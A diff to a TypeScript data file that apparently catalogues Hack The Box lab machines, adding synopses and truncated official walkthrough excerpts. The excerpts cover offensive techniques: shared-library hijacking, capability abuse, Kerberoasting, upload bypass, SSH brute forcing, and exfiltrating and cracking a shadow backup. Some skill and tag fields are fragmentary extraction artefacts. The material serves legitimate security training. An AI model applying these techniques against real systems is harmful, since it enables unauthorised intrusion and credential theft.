+    "officialWalkthrough": "### 📋 Official Synopsis\nDab is a challenging machine, that features an interesting\n\n### 🎯 Core Skills\n- **Wfuzz advanced**\n\n### 🛡️ Associated CVEs\n`CVE-2018-15473`\n\n### ⚔️ Foothold Vector\npath. It teaches techniques and concepts that are useful to know when assessing Web and Linux environments. Skills Required ● Basic knowledge of Web application enumeration techniques ● Basic Linux enumeration skills ● Basic knowledge of binary debugging Skills Learned ● Wfuzz advanced enumeration ● Memcached enumeration ● OpenSSH username enumeration ● System search path order abuse ● Creation of a malicious shared library\n\n### 👑 Privilege Escalation\nShared library load order hijack The setuid binary myexec is run again, which accepts the password \"s3cur3l0g1n\". The function \"seclogin\" is called, but doesn't seem to have any functionality yet. The system search path order means that the \"/tmp\" directory will be checked before the \"/lib\" and \"/usr/lib\" directories. If a malicious libseclogin.so is created in \"/tmp\", and the library cache is updated using ldconfig, then myexec will attempt to load the malicious library. IppSec uses the process below to create a malicious library, which will return a root shell. libseclogin.c is created in \"/tmp\", with the code below, and then compiled. #include <stdlib."
   },
   {
     "id": "htb-waldo",
@@ -9507,15 +11575,26 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Medium",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "HTB",
+      "Linux-Capabilities",
+      "Rbash-escape-techniques",
+      "Source-code-review"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/waldo",
     "writeupUrl": "https://0xdf.gitlab.io/tags#waldo",
-    "hint": "Hack The Box Linux machine. Rated Medium difficulty.",
+    "hint": "Waldo is a medium difficulty machine, which highlights the risk of insufficient input validation, provides the challenge of rbash escape or bypassing, and showcases an interesting privilege escalation vector involving Linux Capabilities, all of which may be found in real environm",
     "timeSpentSeconds": 0,
     "createdAt": "2018-08-04T16:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Waldo is a medium difficulty machine, which highlights the risk of insufficient input validation, provides the challenge of rbash escape or bypassing, and showcases an interesting privilege escalation vector involving Linux Capabilities, all of which may be found in real environments.",
+    "skillsLearned": [
+      "Source code review",
+      "Rbash escape techniques",
+      "Linux Capabilities"
+    ],
+    "officialPdf": "149-Waldo_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nWaldo is a medium difficulty machine, which highlights the risk of insufficient input validation, provides the challenge of rbash escape or bypassing, and showcases an interesting privilege escalation vector involving Linux Capabilities, all of which may be found in real environments.\n\n### 🎯 Core Skills\n- **Source code review**\n- **Rbash escape techniques**\n- **Linux Capabilities**\n\n### ⚔️ Foothold Vector\nAfter fixing the formatting of the private key, an SSH session is opened on Waldo as \"nobody\", and user.txt is gained. ssh nobody@10.10.10.87 -i id_rsa\n\n### 👑 Privilege Escalation\nExploiting Linux Capabilities Enumeration of the home directory reveals various binaries and \"logMonitor-0.1\" seems interesting as it might have been conferred privileges in order to read log files. However, the SETUID bit has not been set. A less well-known technique of allowing binaries to run with elevated privileges are Linux Capabilities. The Post \"Linux Capabilities - A friend and foe\" by m0noc provides a good overview of this subject. https://blog.m0noc.com/2016/05/linux-capabilities-friend-and-foe.html A check for assigned capabilities can be performed with the getcap utility. This reveals that both logMonitor-0."
   },
   {
     "id": "htb-active",
@@ -9531,10 +11610,17 @@ export const INITIAL_MACHINES: Machine[] = [
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/active",
     "writeupUrl": "https://0xdf.gitlab.io/tags#active",
-    "hint": "Hack The Box Windows machine. Rated Easy difficulty.",
+    "hint": "Active is an easy to medium difficulty machine, which features two very prevalent techniques to gain privileges within an Active Directory environment.",
     "timeSpentSeconds": 0,
     "createdAt": "2018-07-28T16:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Active is an easy to medium difficulty machine, which features two very prevalent techniques to gain privileges within an Active Directory environment.",
+    "skillsLearned": [
+      "Basic knowledge of Active Directory",
+      "authentication and shared folders"
+    ],
+    "officialPdf": "148-Active_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nActive is an easy to medium difficulty machine, which features two very prevalent techniques to gain privileges within an Active Directory environment.\n\n### 🎯 Core Skills\n- **Basic knowledge of Active Directory**\n- **authentication and shared folders**\n\n### ⚔️ Foothold Vector\n● Identification and exploitation of Kerberoastable accounts\n\n### 👑 Privilege Escalation\nperspective as Group Policies (and Group Policy Preferences) are stored in the SYSVOL share, which is world-readable to authenticated users. In the Active video, IppSec shows different ways of extracting the Groups.xml file from Linux. smbclient with with RECURSE set to ON"
   },
   {
     "id": "htb-reddish",
@@ -9545,15 +11631,23 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Insane",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "HTB",
+      "Tunneling"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/reddish",
     "writeupUrl": "https://0xdf.gitlab.io/tags#reddish",
-    "hint": "Hack The Box Linux machine. Rated Insane difficulty.",
+    "hint": "Reddish is a very challenging but rewarding machine, which teaches concepts and techniques applicable to many situations. This writeup serves as a written compliment to IppSec's Reddish video, which is a masterclass in tunneling, and directly references it.",
     "timeSpentSeconds": 0,
     "createdAt": "2018-07-21T16:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Reddish is a very challenging but rewarding machine, which teaches concepts and techniques applicable to many situations. This writeup serves as a written compliment to IppSec's Reddish video, which is a masterclass in tunneling, and directly references it. IppSec's videos are packed full of learning and are highly recommended!",
+    "skillsLearned": [
+      "Gaining situational awareness",
+      "Tunneling"
+    ],
+    "officialPdf": "147-Reddish_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nReddish is a very challenging but rewarding machine, which teaches concepts and techniques applicable to many situations. This writeup serves as a written compliment to IppSec's Reddish video, which is a masterclass in tunneling, and directly references it. IppSec's videos are packed full of learning and are highly recommended!\n\n### 🎯 Core Skills\n- **Gaining situational awareness**\n- **Tunneling**\n\n### ⚔️ Foothold Vector\nof default Redis configurations ● Leveraging Cron jobs for lateral movement and"
   },
   {
     "id": "htb-hawk",
@@ -9564,15 +11658,26 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Medium",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "Drupal",
+      "HTB",
+      "IppSec-Hawk-video)"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/hawk",
     "writeupUrl": "https://0xdf.gitlab.io/tags#hawk",
-    "hint": "Hack The Box Linux machine. Rated Medium difficulty.",
+    "hint": "Hawk is a medium to hard difficulty machine, which provides excellent practice in pentesting Drupal. The exploitable H2 DBMS installation is also realistic as web-based SQL consoles (RavenDB etc.) are found in many environments.",
     "timeSpentSeconds": 0,
     "createdAt": "2018-07-14T16:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Hawk is a medium to hard difficulty machine, which provides excellent practice in pentesting Drupal. The exploitable H2 DBMS installation is also realistic as web-based SQL consoles (RavenDB etc.) are found in many environments. The OpenSSL decryption challenge increases the difficulty of this machine.",
+    "skillsLearned": [
+      "OpenSSL cipher experimentation,",
+      "brute force and decryption (courtesy of",
+      "IppSec Hawk video)",
+      "Drupal"
+    ],
+    "officialPdf": "146-Hawk_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nHawk is a medium to hard difficulty machine, which provides excellent practice in pentesting Drupal. The exploitable H2 DBMS installation is also realistic as web-based SQL consoles (RavenDB etc.) are found in many environments. The OpenSSL decryption challenge increases the difficulty of this machine.\n\n### 🎯 Core Skills\n- **OpenSSL cipher experimentation,**\n- **brute force and decryption (courtesy of**\n- **IppSec Hawk video)**\n- **Drupal**\n\n### ⚔️ Foothold Vector\nknowledge ● Knowledge of tunneling techniques Skills Learned ● OpenSSL cipher experimentation, brute force and decryption (courtesy of IppSec Hawk video) ● Drupal enumeration and exploitation ● H2 DBMS enumeration and exploitation\n\n### 👑 Privilege Escalation\nknowledge ● Knowledge of tunneling techniques Skills Learned ● OpenSSL cipher experimentation, brute force and decryption (courtesy of IppSec Hawk video) ● Drupal enumeration and exploitation ● H2 DBMS enumeration and exploitation"
   },
   {
     "id": "htb-mischief",
@@ -9583,15 +11688,25 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Insane",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "HTB",
+      "techniques"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/mischief",
     "writeupUrl": "https://0xdf.gitlab.io/tags#mischief",
-    "hint": "Hack The Box Linux machine. Rated Insane difficulty.",
+    "hint": "Mischief is hard to insane difficulty machine that highlights the risks involved with exposing SNMP, and the dangers of passing credentials over the command line. It also features a \"ping\" admin page - functionality often found on appliances, which is worth testing for RCE vulner",
     "timeSpentSeconds": 0,
     "createdAt": "2018-07-07T16:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Mischief is hard to insane difficulty machine that highlights the risks involved with exposing SNMP, and the dangers of passing credentials over the command line. It also features a \"ping\" admin page - functionality often found on appliances, which is worth testing for RCE vulnerabilities.",
+    "skillsLearned": [
+      "Familiarity with SNMP OIDs",
+      "IPv6 decimal to hexadecimal encoding",
+      "techniques",
+      "Establishment of IPv6 reverse shell"
+    ],
+    "officialPdf": "145-Mischief_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nMischief is hard to insane difficulty machine that highlights the risks involved with exposing SNMP, and the dangers of passing credentials over the command line. It also features a \"ping\" admin page - functionality often found on appliances, which is worth testing for RCE vulnerabilities.\n\n### 🎯 Core Skills\n- **Familiarity with SNMP OIDs**\n- **IPv6 decimal to hexadecimal encoding**\n- **techniques**\n- **Establishment of IPv6 reverse shell**\n\n### ⚔️ Foothold Vector\nGain Access to Command Execution Panel In order to navigate to the IPv6 website, the address needs to be encapsulated in square brackets. http://[dead:beef::250:56ff:fe8f:6451] A Command Execution Panel is now accessible but requires authentication. The credentials gained from SNMP enumeration (loki:godofmischief) are used to access the website running on 3366. This results in additional credentials - loki:trickeryanddeceit Attempting to login to the IPv6 website using these credentials is unsuccessful. However, after trying common usernames (admin, administrator) with the password, access is gained using administrator:trickeryanddeceit\n\n### 👑 Privilege Escalation\nThe credentials file in loki's home directory is examined, which contains the password lokiisthebestnorsegod. Using su or ssh a shell as loki can be gained. It is worth checking the .bash_history file in case credentials has been passed over the command-line. This reveals the password lokipasswordmischieftrickery. The user loki is not able to use su, and so the current shell is exited, reverting to www-data. The attempt to su to root using the gained password is now successful."
   },
   {
     "id": "htb-jerry",
@@ -9602,12 +11717,14 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Easy",
     "status": "completed",
     "tags": [
-      "HTB"
+      "Basic-script-debugging",
+      "HTB",
+      "SILENTTRINITY-post"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/jerry",
     "writeupUrl": "https://0xdf.gitlab.io/tags#jerry",
-    "hint": "Hack The Box Windows machine. Rated Easy difficulty.",
+    "hint": "Although Jerry is one of the easier machines on Hack The Box, it is realistic as Apache Tomcat is often found exposed and configured with common or weak credentials.",
     "timeSpentSeconds": 3600,
     "createdAt": "2018-06-30T16:00:00.000000Z",
     "updatedAt": "2026-08-20T11:30:00.000Z",
@@ -9616,7 +11733,15 @@ export const INITIAL_MACHINES: Machine[] = [
     "userPwnedAt": "2026-08-20T10:00:00.000Z",
     "rootPwnedAt": "2026-08-20T11:30:00.000Z",
     "timeToUserSeconds": 1500,
-    "timeToRootSeconds": 3600
+    "timeToRootSeconds": 3600,
+    "officialSynopsis": "Although Jerry is one of the easier machines on Hack The Box, it is realistic as Apache Tomcat is often found exposed and configured with common or weak credentials.",
+    "skillsLearned": [
+      "Basic script debugging",
+      "Custom war file payload creation",
+      "SILENTTRINITY post"
+    ],
+    "officialPdf": "144-Jerry_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nAlthough Jerry is one of the easier machines on Hack The Box, it is realistic as Apache Tomcat is often found exposed and configured with common or weak credentials.\n\n### 🎯 Core Skills\n- **Basic script debugging**\n- **Custom war file payload creation**\n- **SILENTTRINITY post**\n\n### ⚔️ Foothold Vector\nframework installation and usage (courtesy of IppSec Jerry video)\n\n### 👑 Privilege Escalation\nframework installation and usage (courtesy of IppSec Jerry video)"
   },
   {
     "id": "htb-reel",
@@ -9627,15 +11752,29 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Hard",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "CVE-2017-0199",
+      "HTB",
+      "Identification-and",
+      "and-listener)"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/reel",
     "writeupUrl": "https://0xdf.gitlab.io/tags#reel",
-    "hint": "Hack The Box Windows machine. Rated Hard difficulty.",
+    "hint": "Reel is medium to hard difficulty machine, which requires a client-side attack to bypass the perimeter, and highlights a technique for gaining privileges in an Active Directory environment.",
     "timeSpentSeconds": 0,
     "createdAt": "2018-06-23T16:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Reel is medium to hard difficulty machine, which requires a client-side attack to bypass the perimeter, and highlights a technique for gaining privileges in an Active Directory environment.",
+    "skillsLearned": [
+      "Extraction and use of document",
+      "metadata in a phishing attack",
+      "Creation of attacker infrastructure",
+      "(malicious SMTP server, web server",
+      "and listener)",
+      "Identification and"
+    ],
+    "officialPdf": "143-Reel_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nReel is medium to hard difficulty machine, which requires a client-side attack to bypass the perimeter, and highlights a technique for gaining privileges in an Active Directory environment.\n\n### 🎯 Core Skills\n- **Extraction and use of document**\n- **metadata in a phishing attack**\n- **Creation of attacker infrastructure**\n- **(malicious SMTP server, web server**\n- **and listener)**\n- **Identification and**\n\n### 🛡️ Associated CVEs\n`CVE-2017-0199`\n\n### 👑 Privilege Escalation\nEnumeration Extraction of PowerShell Credentials Enumeration of Nico's desktop reveals a PowerShell credential file. Credentials for HTB\\Tom are extracted. $credential = import-clixml -path cred.xml;$credential.GetNetworkCredential().username;$credential.GetNetworkCredential().pass word"
   },
   {
     "id": "htb-bounty",
@@ -9646,15 +11785,25 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Easy",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "HTB",
+      "patches"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/bounty",
     "writeupUrl": "https://0xdf.gitlab.io/tags#bounty",
-    "hint": "Hack The Box Windows machine. Rated Easy difficulty.",
+    "hint": "Bounty is an easy to medium difficulty machine, which features an interesting technique to bypass file uploader protections and achieve code execution. This machine also highlights the importance of keeping systems updated with the latest security patches.",
     "timeSpentSeconds": 0,
     "createdAt": "2018-06-16T16:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Bounty is an easy to medium difficulty machine, which features an interesting technique to bypass file uploader protections and achieve code execution. This machine also highlights the importance of keeping systems updated with the latest security patches.",
+    "skillsLearned": [
+      "web.config payload creation",
+      "Identification of missing security",
+      "patches",
+      "Exploit selection and execution"
+    ],
+    "officialPdf": "142-Bounty_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nBounty is an easy to medium difficulty machine, which features an interesting technique to bypass file uploader protections and achieve code execution. This machine also highlights the importance of keeping systems updated with the latest security patches.\n\n### 🎯 Core Skills\n- **web.config payload creation**\n- **Identification of missing security**\n- **patches**\n- **Exploit selection and execution**\n\n### ⚔️ Foothold Vector\nBurp Suite It doesn't seem possible to upload an aspx webshell directly, and so it is worth checking if any other file types are allowed. After obtaining a list of IIS/ASP extensions, the upload request is sent to Burp Intruder. curl --silent https://msdn.microsoft.com/en-us/library/2wawkw1c.aspx | grep \"<p>.\" | awk -F\">\" '{print $2}'| awk -F\"<\" '{print $1}' | tr ' ' '\\n' | grep \"^\\.\" | sed -e 's/,//g' > iis_extensions.txt The response length for .config is different and inspection reveals that it was uploaded successfully.\n\n### 👑 Privilege Escalation\nIdentification of Missing Patches It seems that no hotfixes have been applied, which makes it likely vulnerable to kernel exploits."
   },
   {
     "id": "htb-smasher",
@@ -9665,15 +11814,28 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Insane",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "Binary-file-fuzzing",
+      "Binary-file-reversing",
+      "Exploit-development",
+      "HTB",
+      "Padding-Oracle"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/smasher",
     "writeupUrl": "https://0xdf.gitlab.io/tags#smasher",
-    "hint": "Hack The Box Linux machine. Rated Insane difficulty.",
+    "hint": "Smasher is a very challenging machine, that requires exploit development, scripting, source code review and Linux exploitation skills. A vulnerable web server is found to be running, which can be exploited to gain a shell using ROP.",
     "timeSpentSeconds": 0,
     "createdAt": "2018-06-09T16:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Smasher is a very challenging machine, that requires exploit development, scripting, source code review and Linux exploitation skills. A vulnerable web server is found to be running, which can be exploited to gain a shell using ROP. A program running on a port locally is vulnerable to padding oracle and can be exploited to gain sensitive information. After logging in, the user is found to have access to a SUID file which can be exploited due to a race condition.",
+    "skillsLearned": [
+      "Binary file fuzzing",
+      "Exploit development",
+      "Binary file reversing",
+      "Padding Oracle"
+    ],
+    "officialPdf": "141-Smasher_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nSmasher is a very challenging machine, that requires exploit development, scripting, source code review and Linux exploitation skills. A vulnerable web server is found to be running, which can be exploited to gain a shell using ROP. A program running on a port locally is vulnerable to padding oracle and can be exploited to gain sensitive information. After logging in, the user is found to have access to a SUID file which can be exploited due to a race condition.\n\n### 🎯 Core Skills\n- **Binary file fuzzing**\n- **Exploit development**\n- **Binary file reversing**\n- **Padding Oracle**\n\n### ⚔️ Foothold Vector\nskills. A vulnerable web server is found to be running, which can be exploited to gain a shell using ROP. A program running on a port locally is vulnerable to padding oracle and can be exploited to gain sensitive information. After logging in, the user is found to have access to a SUID file which can be exploited due to a race condition. Skills Required ● Knowledge of source code review and fuzzing techniques ● Knowledge of reversing techniques ● Intermediate Python skills Skills Learned ● Binary file fuzzing ● Exploit development ● Binary file reversing ● Padding Oracle exploitation\n\n### 👑 Privilege Escalation\nEnumerating the SUID files on the box we come across a binary named checker. Running the binary needs some arguments which seems to be filenames. We create a file and add some contents in it and then run the binary. echo abc > file checker file We see that it just prints out it's contents along with the owner's uid."
   },
   {
     "id": "htb-devoops",
@@ -9684,15 +11846,24 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Medium",
     "status": "backlog",
     "tags": [
+      "Exploiting-Python-pickle",
       "HTB"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/devoops",
     "writeupUrl": "https://0xdf.gitlab.io/tags#devoops",
-    "hint": "Hack The Box Linux machine. Rated Medium difficulty.",
+    "hint": "DevOops is a relatively quick machine to complete which focuses on XML external entities and Python pickle vulnerabilities to gain a foothold.",
     "timeSpentSeconds": 0,
     "createdAt": "2018-06-02T16:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "DevOops is a relatively quick machine to complete which focuses on XML external entities and Python pickle vulnerabilities to gain a foothold.",
+    "skillsLearned": [
+      "Exploiting XML external entities",
+      "Exploiting Python pickle",
+      "Enumerating git revision history"
+    ],
+    "officialPdf": "140-DevOops_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nDevOops is a relatively quick machine to complete which focuses on XML external entities and Python pickle vulnerabilities to gain a foothold.\n\n### 🎯 Core Skills\n- **Exploiting XML external entities**\n- **Exploiting Python pickle**\n- **Enumerating git revision history**\n\n### ⚔️ Foothold Vector\n. Skills Required ● Basic/intermediate knowledge of Linux ● Basic/intermediate knowledge of Python Skills Learned ● Exploiting XML external entities ● Exploiting Python pickle ● Enumerating git revision history\n\n### 👑 Privilege Escalation\nGit History There is a git repository located at /home/roosa/work/blogfeed. Examining the commit history with git log shows a commit referencing an incorrect key file. Checking the commit with git diff d387abf63e05c9628a59195cec9311751bdb283f reveals the root SSH key."
   },
   {
     "id": "htb-dropzone",
@@ -9703,15 +11874,25 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Hard",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "Exploit-modification",
+      "HTB",
+      "TFTP-data-transfer"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/dropzone",
     "writeupUrl": "https://0xdf.gitlab.io/tags#dropzone",
-    "hint": "Hack The Box Windows machine. Rated Hard difficulty.",
+    "hint": "Dropzone is an interesting machine that highlights a technique used by the Stuxnet worm. The discovery of NTFS data streams provides an additional challenge.",
     "timeSpentSeconds": 0,
     "createdAt": "2018-05-19T16:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Dropzone is an interesting machine that highlights a technique used by the Stuxnet worm. The discovery of NTFS data streams provides an additional challenge.",
+    "skillsLearned": [
+      "TFTP data transfer",
+      "Exploit modification",
+      "Discovery of NTFS data streams"
+    ],
+    "officialPdf": "139-Dropzone_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nDropzone is an interesting machine that highlights a technique used by the Stuxnet worm. The discovery of NTFS data streams provides an additional challenge.\n\n### 🎯 Core Skills\n- **TFTP data transfer**\n- **Exploit modification**\n- **Discovery of NTFS data streams**\n\n### ⚔️ Foothold Vector\nCreation of Malicious MOF File With prior knowledge of the Stuxnet Windows Printer Spooler vulnerability (MS10-061), or by searching for Windows XP write-privilege attacks, it seems likely that the initial vector requires creating a malicious MOF file. The blog post below by Xst3nZ highlights how this can be weaponized and is well worth a read. http://poppopret.blogspot.com/2011/09/playing-with-mof-files-on-windows-for.html The Metasploit Framework uses malicious MOF files as payloads for several modules, via the wbemexec.rb mixin. https://github.com/rapid7/metasploit-framework/wiki/How-to-use-WbemExec-for-a-write-privilege- attack-on-Windows wbemexec."
   },
   {
     "id": "htb-tartarsauce",
@@ -9722,15 +11903,23 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Medium",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "HTB",
+      "Identification-and"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/tartarsauce",
     "writeupUrl": "https://0xdf.gitlab.io/tags#tartarsauce",
-    "hint": "Hack The Box Linux machine. Rated Medium difficulty.",
+    "hint": "TartarSauce is a fairly challenging box that highlights the importance of a broad remote",
     "timeSpentSeconds": 0,
     "createdAt": "2018-05-12T16:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "TartarSauce is a fairly challenging box that highlights the importance of a broad remote",
+    "skillsLearned": [
+      "Static analysis of shell scripts",
+      "Identification and"
+    ],
+    "officialPdf": "138-TartarSauce_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nTartarSauce is a fairly challenging box that highlights the importance of a broad remote\n\n### 🎯 Core Skills\n- **Static analysis of shell scripts**\n- **Identification and**\n\n### 👑 Privilege Escalation\nrequiring abuses of the tar command. Attention to detail when reviewing tool output is beneficial when attempting this machine. Skills Required ● Basic knowledge of web application enumeration tools ● Intermediate Linux command-line knowledge Skills Learned ● Static analysis of shell scripts ● Identification and exploitation of tar GTFOBin using multiple techniques"
   },
   {
     "id": "htb-fighter",
@@ -9741,15 +11930,32 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Insane",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "AppLocker-bypassing",
+      "Command",
+      "HTB",
+      "Post",
+      "blacklist-bypassing",
+      "line-obfuscation"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/fighter",
     "writeupUrl": "https://0xdf.gitlab.io/tags#fighter",
-    "hint": "Hack The Box Windows machine. Rated Insane difficulty.",
+    "hint": "Fighter is a very challenging machine, that requires good web and post-exploitation",
     "timeSpentSeconds": 0,
     "createdAt": "2018-05-05T16:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Fighter is a very challenging machine, that requires good web and post-exploitation",
+    "skillsLearned": [
+      "Advanced SQL injection technique and",
+      "blacklist bypassing",
+      "AppLocker bypassing",
+      "Command",
+      "line obfuscation",
+      "Exploit selection and modification",
+      "Post"
+    ],
+    "officialPdf": "137-Fighter_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nFighter is a very challenging machine, that requires good web and post-exploitation\n\n### 🎯 Core Skills\n- **Advanced SQL injection technique and**\n- **blacklist bypassing**\n- **AppLocker bypassing**\n- **Command**\n- **line obfuscation**\n- **Exploit selection and modification**\n- **Post**\n\n### ⚔️ Foothold Vector\nenumeration. It highlights the fragility of blacklists and showcases techniques that are useful from both offensive and defensive standpoints. Skills Required ● Intermediate knowledge of Web application enumeration techniques ● Intermediate knowledge of SQL injection techniques ● Intermediate knowledge of Windows ● Intermediate knowledge of disassembly Skills Learned ● Advanced SQL injection technique and blacklist bypassing ● AppLocker bypassing ● Command-line obfuscation ● Exploit selection and modification ● Post-exploitation enumeration ● Reverse engineering\n\n### 👑 Privilege Escalation\nenumeration. It highlights the fragility of blacklists and showcases techniques that are useful from both offensive and defensive standpoints. Skills Required ● Intermediate knowledge of Web application enumeration techniques ● Intermediate knowledge of SQL injection techniques ● Intermediate knowledge of Windows ● Intermediate knowledge of disassembly Skills Learned ● Advanced SQL injection technique and blacklist bypassing ● AppLocker bypassing ● Command-line obfuscation ● Exploit selection and modification ● Post-exploitation enumeration ● Reverse engineering"
   },
   {
     "id": "htb-sunday",
@@ -9760,15 +11966,25 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Easy",
     "status": "backlog",
     "tags": [
+      "Brute-forcing-SSH",
+      "Exploiting-Sudo-NOPASSWD",
       "HTB"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/sunday",
     "writeupUrl": "https://0xdf.gitlab.io/tags#sunday",
-    "hint": "Hack The Box Linux machine. Rated Easy difficulty.",
+    "hint": "Sunday is a fairly simple machine, however it uses fairly old software and can be a bit unpredictable at times. It mainly focuses on exploiting the Finger service as well as the use of weak credentials.",
     "timeSpentSeconds": 0,
     "createdAt": "2018-04-28T16:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Sunday is a fairly simple machine, however it uses fairly old software and can be a bit unpredictable at times. It mainly focuses on exploiting the Finger service as well as the use of weak credentials.",
+    "skillsLearned": [
+      "Enumerating users through Finger",
+      "Brute forcing SSH",
+      "Exploiting Sudo NOPASSWD"
+    ],
+    "officialPdf": "136-Sunday_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nSunday is a fairly simple machine, however it uses fairly old software and can be a bit unpredictable at times. It mainly focuses on exploiting the Finger service as well as the use of weak credentials.\n\n### 🎯 Core Skills\n- **Enumerating users through Finger**\n- **Brute forcing SSH**\n- **Exploiting Sudo NOPASSWD**\n\n### ⚔️ Foothold Vector\nSSH Brute Force While Hydra does not work in this instance, there are several other tools out there that can get the job done. Brute forcing will find the password for sunny is sunday, and a shell can be obtained by connecting over SSH on port 22022.\n\n### 👑 Privilege Escalation\nSammy In /backups there are two backup files. They can be copy/pasted as they are small, or by using base64 -w 0 shadow.backup on the target followed by echo \"<BASE64 HERE>\" > shadow.b64 && base64 -d shadow.b64 > shadow.backup on the attacking machine. Running john with rockyou.txt finds the password for sammy fairly quickly."
   },
   {
     "id": "htb-olympus",
@@ -9779,15 +11995,29 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Medium",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "Cracking-WPA-handshakes",
+      "Exploiting-Xdebug",
+      "HTB",
+      "transfers"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/olympus",
     "writeupUrl": "https://0xdf.gitlab.io/tags#olympus",
-    "hint": "Hack The Box Linux machine. Rated Medium difficulty.",
+    "hint": "Olympia is not overly difficult, however there are many steps involved in getting access to the main system. There is a heavy focus on the use of Docker, with a variety of topics and techniques along the way.",
     "timeSpentSeconds": 0,
     "createdAt": "2018-04-21T16:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
